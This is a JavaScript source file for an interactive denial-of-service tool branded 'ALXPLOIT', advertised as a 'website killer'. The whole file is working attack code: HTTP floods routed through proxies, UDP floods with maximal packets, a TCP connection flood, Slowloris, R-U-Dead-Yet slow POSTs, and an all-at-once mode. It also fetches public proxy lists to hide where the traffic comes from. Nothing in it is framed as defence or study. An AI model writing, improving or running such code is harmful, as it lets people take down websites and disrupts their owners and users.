import net from 'net';
import tls from 'tls';
import http from 'http';
import https from 'https';
import dgram from 'dgram';
import fs from 'fs';
import os from 'os';
import readline from 'readline';

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

console.log(`
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                       ║
║      █████╗ ██╗  ██╗ ██████╗ ██╗     ██████╗ ██╗████████╗     ██████╗ ██████╗  ██████╗ ███████╗                      ║
║     ██╔══██╗╚██╗██╔╝██╔═══██╗██║     ╚════██╗██║╚══██╔══╝     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                      ║
║     ███████║ ╚███╔╝ ██║   ██║██║      █████╔╝██║   ██║        ██║  ██║██████╔╝██║   ██║███████╗                      ║
║     ██╔══██║ ██╔██╗ ██║   ██║██║     ██╔═══╝ ██║   ██║        ██║  ██║██╔══██╗██║   ██║╚════██║                      ║
║     ██║  ██║██╔╝ ██╗╚██████╔╝███████╗███████╗██║   ██║        ██████╔╝██║  ██║╚██████╔╝███████║                      ║
║     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝        ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                      ║
║                                                                                                                       ║
║                                    ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT                                                    ║
║                              ███████╗████████╗████████╗ █████╗  ██████╗██╗  ██╗                                     ║
║                              ██╔════╝╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                                     ║
║                              █████╗     ██║      ██║   ███████║██║     █████╔╝                                      ║
║                              ██╔══╝     ██║      ██║   ██╔══██║██║     ██╔═██╗                                      ║
║                              ██║        ██║      ██║   ██║  ██║╚██████╗██║  ██╗                                     ║
║                              ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                     ║
║                                                                                                                       ║
║                    🔥 ULTIMATE DDOS TOOLKIT - WEBSITE KILLER EDITION 🔥                                               ║
║                         ⚠️  PROXY SUPPORT | 6 ATTACK METHODS | MAX POWER ⚠️                                           ║
║                                                                                                                       ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
`);

let proxies = [];
let active = false;
let currentAttack = null;
let stats = { total: 0, success: 0, failed: 0, packets: 0 };

function loadProxies() {
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        proxies = content.split('\n').filter(line => line.trim() && !line.startsWith('#'));
        proxies = [...new Set(proxies)];
        console.log(`\n✓ Loaded ${proxies.length} proxies\n`);
        return proxies.length;
    } catch (e) {
        console.log('\n⚠️ No proxy.txt found. Running without proxies.\n');
        return 0;
    }
}

function downloadProxies() {
    console.log('\n📥 Downloading fresh proxies...');
    const https = require('https');
    const sources = [
        'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
        'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'
    ];
    let allProxies = [];
    let completed = 0;
    
    sources.forEach(source => {
        https.get(source, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                const proxies = data.split('\n').filter(line => line.trim());
                allProxies.push(...proxies);
                completed++;
                if (completed === sources.length) {
                    allProxies = [...new Set(allProxies)];
                    fs.writeFileSync('proxy.txt', allProxies.join('\n'));
                    console.log(`\n✓ Downloaded ${allProxies.length} proxies\n`);
                    loadProxies();
                }
            });
        }).on('error', () => completed++);
    });
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/537.36'
];

function httpFlood(target, duration, useProxy) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const client = isHttps ? https : http;
    let localActive = true;
    let requestCount = 0;
    
    const attackLoop = () => {
        if (!localActive) return;
        
        const headers = {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive'
        };
        
        let options = { hostname: url.hostname, path: '/', headers, method: 'GET' };
        
        if (useProxy && proxies.length > 0) {
            const proxy = getRandomProxy();
            if (proxy) {
                const [proxyHost, proxyPort] = proxy.split(':');
                options = { ...options, host: proxyHost, port: parseInt(proxyPort), path: target };
            }
        }
        
        const req = client.request(options, (res) => {
            stats.total++;
            if (res.statusCode >= 200 && res.statusCode < 400) stats.success++;
            else stats.failed++;
            res.resume();
            if (localActive) attackLoop();
        });
        
        req.on('error', () => {
            stats.total++;
            stats.failed++;
            if (localActive) attackLoop();
        });
        
        req.setTimeout(3000, () => req.destroy());
        req.end();
    };
    
    for (let i = 0; i < 200; i++) attackLoop();
    
    setTimeout(() => { localActive = false; }, duration * 1000);
}

function udpFlood(target, duration) {
    const socket = dgram.createSocket('udp4');
    const message = Buffer.from('X'.repeat(65500));
    let localActive = true;
    let packetCount = 0;
    
    const sendLoop = () => {
        if (!localActive) return;
        socket.send(message, 0, message.length, 80, target, () => {
            stats.packets++;
            if (localActive) sendLoop();
        });
    };
    
    for (let i = 0; i < 100; i++) sendLoop();
    setTimeout(() => { localActive = false; }, duration * 1000);
}

function tcpSynFlood(target, duration) {
    let localActive = true;
    
    const createSocket = () => {
        if (!localActive) return;
        const socket = net.createConnection(80, target);
        socket.on('connect', () => {
            socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\n\r\n`);
            stats.total++;
            setTimeout(() => socket.destroy(), 100);
        });
        socket.on('error', () => socket.destroy());
        socket.setTimeout(1000, () => socket.destroy());
        if (localActive) setTimeout(createSocket, 10);
    };
    
    for (let i = 0; i < 500; i++) createSocket();
    setTimeout(() => { localActive = false; }, duration * 1000);
}

function slowloris(target, duration) {
    let localActive = true;
    const sockets = [];
    
    for (let i = 0; i < 500; i++) {
        const socket = net.createConnection(80, target);
        socket.on('connect', () => {
            socket.write(`GET / HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0\r\n`);
            const interval = setInterval(() => {
                if (!localActive) {
                    clearInterval(interval);
                    socket.destroy();
                    return;
                }
                socket.write(`X-Header: ${Math.random()}\r\n`);
            }, 15000);
            sockets.push({ socket, interval });
            stats.total++;
        });
        socket.on('error', () => socket.destroy());
    }
    
    setTimeout(() => { localActive = false; }, duration * 1000);
}

function rudyAttack(target, duration) {
    let localActive = true;
    
    const attackLoop = () => {
        if (!localActive) return;
        const req = http.request({
            hostname: target,
            port: 80,
            path: '/',
            method: 'POST',
            headers: { 'Content-Length': '1000000' }
        });
        req.on('error', () => {});
        req.write('X'.repeat(100));
        stats.total++;
        setTimeout(() => req.end(), 10000);
        if (localActive) setTimeout(attackLoop, 100);
    };
    
    for (let i = 0; i < 100; i++) attackLoop();
    setTimeout(() => { localActive = false; }, duration * 1000);
}

function startAttack(target, method, duration, useProxy) {
    if (active) {
        console.log('⚠️ Attack already running! Stop it first.\n');
        return;
    }
    
    active = true;
    stats = { total: 0, success: 0, failed: 0, packets: 0 };
    
    console.log(`\n╔════════════════════════════════════════════════════════════════════╗`);
    console.log(`║                         🔥 ATTACK STARTED 🔥                       ║`);
    console.log(`╠════════════════════════════════════════════════════════════════════╣`);
    console.log(`║  🎯 TARGET     : ${target.padEnd(45)}║`);
    console.log(`║  ⚙️ METHOD     : ${method.padEnd(45)}║`);
    console.log(`║  ⏱️ DURATION   : ${duration}s`.padEnd(55) + `║`);
    console.log(`║  🔌 PROXY      : ${useProxy && proxies.length > 0 ? `YES (${proxies.length} proxies)` : 'NO'.padEnd(45)}║`);
    console.log(`║  👤 TEAM       : ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT`.padEnd(49) + `║`);
    console.log(`╚════════════════════════════════════════════════════════════════════╝\n`);
    
    const startTime = Date.now();
    
    if (method === 'http') httpFlood(target, duration, useProxy);
    else if (method === 'udp') udpFlood(target, duration);
    else if (method === 'tcp') tcpSynFlood(target, duration);
    else if (method === 'slow') slowloris(target, duration);
    else if (method === 'rudy') rudyAttack(target, duration);
    else if (method === 'all') {
        httpFlood(target, duration, useProxy);
        udpFlood(target, duration);
        tcpSynFlood(target, duration);
        slowloris(target, duration);
        rudyAttack(target, duration);
    }
    
    const interval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`[${elapsed.toFixed(0)}s] 📊 REQ: ${stats.total} | 📦 PKT: ${stats.packets} | ✅ OK: ${stats.success} | ❌ FAIL: ${stats.failed} | ⚡ RPS: ${Math.round(stats.total / elapsed)}`);
    }, 1000);
    
    setTimeout(() => {
        active = false;
        clearInterval(interval);
        const elapsed = (Date.now() - startTime) / 1000;
        console.log(`\n╔════════════════════════════════════════════════════════════════════╗`);
        console.log(`║                      ✅ ATTACK COMPLETED ✅                      ║`);
        console.log(`╠════════════════════════════════════════════════════════════════════╣`);
        console.log(`║  📊 TOTAL REQUESTS : ${String(stats.total).padEnd(40)}║`);
        console.log(`║  📦 TOTAL PACKETS  : ${String(stats.packets).padEnd(40)}║`);
        console.log(`║  ✅ SUCCESSFUL     : ${String(stats.success).padEnd(40)}║`);
        console.log(`║  ❌ FAILED         : ${String(stats.failed).padEnd(40)}║`);
        console.log(`║  ⚡ AVG RPS        : ${String(Math.round(stats.total / elapsed)).padEnd(40)}║`);
        console.log(`║  ⏱️ DURATION       : ${String(elapsed.toFixed(1) + 's').padEnd(40)}║`);
        console.log(`╠════════════════════════════════════════════════════════════════════╣`);
        console.log(`║  🎯 TARGET ${target} SHOULD BE DOWN NOW!                          ║`);
        console.log(`╚════════════════════════════════════════════════════════════════════╝\n`);
        console.log(`◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT\n`);
        rl.prompt();
    }, duration * 1000);
}

function showMenu() {
    console.log(`
╔════════════════════════════════════════════════════════════════════════════════╗
║                              📋 MAIN MENU 📋                                  ║
╠════════════════════════════════════════════════════════════════════════════════╣
║                                                                                ║
║     ┌─────────────────────────────────────────────────────────────────────┐   ║
║     │  1. HTTP Flood (Layer 7)          - HTTP/HTTPS request flood        │   ║
║     │  2. UDP Flood (Layer 4)           - High bandwidth UDP attack       │   ║
║     │  3. TCP SYN Flood (Layer 4)       - Raw TCP connection flood        │   ║
║     │  4. Slowloris                     - Slow headers attack             │   ║
║     │  5. R-U-Dead-Yet                  - Slow POST attack                │   ║
║     │  6. ALL METHODS                   - Maximum destruction             │   ║
║     │  7. Download Proxies              - Update proxy list               │   ║
║     │  8. Stop Attack                   - Stop current attack             │   ║
║     │  9. Exit                          - Close tool                      │   ║
║     └─────────────────────────────────────────────────────────────────────┘   ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝
`);
}

async function main() {
    loadProxies();
    
    console.log(`
┌─────────────────────────────────────────────────────────────────────────────────┐
│  💡 COMMANDS:                                                                   │
│                                                                                 │
│     attack <target> <method> <duration> <proxy?>                               │
│                                                                                 │
│     Example: attack http://target.com all 60 yes                               │
│     Example: attack http://target.com http 30 no                               │
│                                                                                 │
│  📋 METHODS: http, udp, tcp, slow, rudy, all                                   │
│  🔌 PROXY: yes / no                                                            │
│                                                                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
`);
    
    rl.setPrompt('🔥 DDOS> ');
    rl.prompt();
    
    rl.on('line', async (input) => {
        const args = input.trim().split(' ');
        const cmd = args[0].toLowerCase();
        
        if (cmd === 'attack' && args.length >= 4) {
            const target = args[1];
            const method = args[2].toLowerCase();
            const duration = parseInt(args[3]);
            const useProxy = args[4] === 'yes';
            
            if (isNaN(duration)) {
                console.log('❌ Invalid duration!\n');
                rl.prompt();
                return;
            }
            
            if (!['http', 'udp', 'tcp', 'slow', 'rudy', 'all'].includes(method)) {
                console.log('❌ Invalid method! Use: http, udp, tcp, slow, rudy, all\n');
                rl.prompt();
                return;
            }
            
            startAttack(target, method, duration, useProxy);
        } 
        else if (cmd === 'stop') {
            if (active) {
                active = false;
                console.log('\n🛑 Attack stopped by user.\n');
            } else {
                console.log('\n⚠️ No attack running.\n');
            }
            rl.prompt();
        }
        else if (cmd === 'download-proxy') {
            downloadProxies();
            setTimeout(() => rl.prompt(), 3000);
        }
        else if (cmd === 'menu' || cmd === 'help') {
            showMenu();
            rl.prompt();
        }
        else if (cmd === 'exit' || cmd === 'quit') {
            console.log('\n╔════════════════════════════════════════════════════════════════════╗');
            console.log('║                    👋 GOODBYE! SEE YOU NEXT TIME 👋                 ║');
            console.log('║              ◥𝗗𝗥𝟰𝗞𝟰𝟳𝗛◤ ◥𝗧𝗘𝗔𝗠◤ - ALXPLOIT                         ║');
            console.log('╚════════════════════════════════════════════════════════════════════╝\n');
            process.exit(0);
        }
        else if (cmd === '') {
            rl.prompt();
        }
        else {
            console.log('\n❌ Unknown command! Type "help" or "menu"\n');
            rl.prompt();
        }
    });
}

main();
